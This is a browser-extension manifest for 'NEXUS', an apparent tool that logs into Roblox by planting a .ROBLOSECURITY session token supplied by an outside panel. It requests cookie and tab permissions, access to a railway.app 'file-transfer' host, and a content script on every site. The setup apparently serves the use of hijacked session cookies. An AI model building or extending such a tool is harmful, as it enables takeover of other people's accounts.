{
  "manifest_version": 3,
  "name": "NEXUS — Вход в Roblox",
  "version": "1.0",
  "description": "Автоматический вход в Roblox по .ROBLOSECURITY токену из панели NEXUS",
  "permissions": [
    "cookies",
    "tabs"
  ],
  "host_permissions": [
    "https://*.roblox.com/*",
    "https://apis.roblox.com/*",
    "https://auth.roblox.com/*",
    "https://develop.roblox.com/*",
    "https://arte777.github.io/*",
    "https://file-transfer-production-75ad.up.railway.app/*",
    "http://localhost/*",
    "http://127.0.0.1/*"
  ],
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": ["content.js"],
      "run_at": "document_end"
    }
  ],
  "background": {
    "service_worker": "background.js"
  },
  "icons": {
    "128": "icon.png"
  }
}
